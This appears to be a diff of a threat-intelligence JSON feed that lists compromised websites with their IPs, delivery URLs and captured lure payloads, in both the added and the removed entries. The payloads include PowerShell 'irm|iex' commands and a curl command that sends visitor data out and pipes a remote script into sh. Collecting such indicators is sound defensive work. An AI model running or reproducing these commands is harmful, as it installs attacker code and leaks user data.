@@ -1,5 +1,71 @@
 [
   {
+    "UrlDomain": "casinorbitworld.com",
+    "DeliveryUrl": [
+      "browse-login.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "91.108.98.58"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-login.info/4ecdb196ede70a4a",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-login.info/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2&amp;_v=29927058",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-login[.]info/4ecdb196ede70a4a'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-login.info/4ecdb196ede70a4a"
+    ],
+    "ReportId": "cmwwbwpru0j9h0nmlgq3fci7c",
+    "ScannedAt": "2026-11-25T16:19:24.484000+00:00"
+  },
+  {
+    "UrlDomain": "atlaslex.net",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "154.38.166.23"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads"
+    ],
+    "ReportId": "cmwwbvyrq0j8s0nml0zzkgyv1",
+    "ScannedAt": "2026-11-25T16:18:49.464000+00:00"
+  },
+  {
+    "UrlDomain": "agribiotechmarketing.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "184.168.98.17"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads"
+    ],
+    "ReportId": "cmwwbv3ha0j820nml8gy9rxse",
+    "ScannedAt": "2026-11-25T16:18:08.931000+00:00"
+  },
+  {
     "UrlDomain": "chembeam.com",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -1498,68 +1564,5 @@
     ],
     "ReportId": "cmwuwxtsy05ss0nmlxyc8744b",
     "ScannedAt": "2026-11-24T16:32:35.953000+00:00"
-  },
-  {
-    "UrlDomain": "aspectuspeliculas.com.br",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "191.6.211.83"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads"
-    ],
-    "ReportId": "cmwuwwrc505ra0nmluu7bv6rm",
-    "ScannedAt": "2026-11-24T16:31:46.051000+00:00"
-  },
-  {
-    "UrlDomain": "aaau.org.ua",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "89.184.77.206"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads"
-    ],
-    "ReportId": "cmwuwj28t05ej0nmlr95x0d61",
-    "ScannedAt": "2026-11-24T16:21:07.008000+00:00"
-  },
-  {
-    "UrlDomain": "siedlung-altenhof.de",
-    "DeliveryUrl": [
-      "img-codes-cloude.info",
-      "script.google.com",
-      "softify.lat"
-    ],
-    "PayloadUrl": [
-      "https://softify.lat/u/8ecec3ba",
-      "https://script.google.com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec"
-    ],
-    "IP": [
-      "217.160.0.148"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=ebaac78b-e414-4a7b-8b09-cd607584a668&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fsiedlung-altenhof[.]de%2F&os=Linux%20x86_64&lastVisitAt=2026-11-24T16%3A01%3A02.513Z&lastShellAt=2026-11-24T16%3A01%3A02.513Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec",
-      "https://softify.lat/u/8ecec3ba"
-    ],
-    "ReportId": "cmwuvv1df056u0nmlb1od3iwi",
-    "ScannedAt": "2026-11-24T16:02:26.173000+00:00"
   }
 ]
